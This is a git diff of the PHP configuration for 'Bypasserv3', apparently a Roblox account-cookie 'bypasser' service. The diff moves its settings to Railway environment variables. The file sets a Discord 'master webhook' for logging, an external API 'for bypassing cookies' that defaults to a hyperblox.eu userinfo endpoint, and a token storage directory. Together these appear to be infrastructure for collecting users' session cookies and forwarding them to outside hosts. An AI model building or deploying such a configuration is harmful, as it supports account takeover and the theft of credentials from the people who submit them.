@@ -1,6 +1,7 @@
 <?php
 /**
  * Bypasserv3 - Configuration
+ * Uses Railway environment variables
  */
 
 if (!defined('CONFIG_LOADED')) {
@@ -21,15 +22,22 @@ define('BASE_PATH', __DIR__ . '/');
 define('DATA_PATH', BASE_PATH . 'data/');
 define('TEMPLATE_PATH', BASE_PATH . 'template/');
 
-// Master webhook for logging (CHANGE THIS!)
-define('MASTER_WEBHOOK', 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN');
+// Get configuration from Railway environment variables
+define('MASTER_WEBHOOK', getenv('MASTER_WEBHOOK') ?: '');
+define('EXTERNAL_API_URL', getenv('EXTERNAL_API_URL') ?: 'https://hyperblox.eu/controlPage/apis/userinfo.php');
 
-// External API endpoint for bypassing cookies (CHANGE THIS!)
-define('EXTERNAL_API_URL', 'https://rblxbypasser.com/api/bypass');
+// Validate required environment variables
+if (empty(MASTER_WEBHOOK)) {
+    error_log('WARNING: MASTER_WEBHOOK environment variable is not set!');
+}
 
-// Rate limiting
-define('RATE_LIMIT_REQUESTS', 50);
-define('RATE_LIMIT_WINDOW', 3600);
+if (empty(EXTERNAL_API_URL)) {
+    error_log('WARNING: EXTERNAL_API_URL environment variable is not set!');
+}
+
+// Rate limiting (can be overridden by env vars)
+define('RATE_LIMIT_REQUESTS', getenv('RATE_LIMIT_REQUESTS') ?: 50);
+define('RATE_LIMIT_WINDOW', getenv('RATE_LIMIT_WINDOW') ?: 3600);
 
 // Session configuration
 ini_set('session.cookie_httponly', 1);
@@ -41,12 +49,13 @@ ini_set('session.cookie_samesite', 'Lax');
 $requiredPaths = [
     DATA_PATH,
     DATA_PATH . 'tokens/',
+    DATA_PATH . 'instances/',
 ];
 
 foreach ($requiredPaths as $path) {
     if (!is_dir($path)) {
         if (!mkdir($path, 0755, true)) {
-            die('ERROR: Failed to create required directory: ' . $path);
+            error_log('ERROR: Failed to create required directory: ' . $path);
         }
     }
 }
@@ -82,5 +91,15 @@ header('X-Content-Type-Options: nosniff');
 header('X-Frame-Options: SAMEORIGIN');
 header('X-XSS-Protection: 1; mode=block');
 header('Referrer-Policy: strict-origin-when-cross-origin');
+
+// Railway-specific detection
+$isRailway = getenv('RAILWAY_ENVIRONMENT') !== false;
+if ($isRailway) {
+    define('IS_RAILWAY', true);
+    define('RAILWAY_ENV', getenv('RAILWAY_ENVIRONMENT'));
+    define('RAILWAY_SERVICE', getenv('RAILWAY_SERVICE_NAME') ?: 'bypasserv3');
+} else {
+    define('IS_RAILWAY', false);
+}
 
 ?>
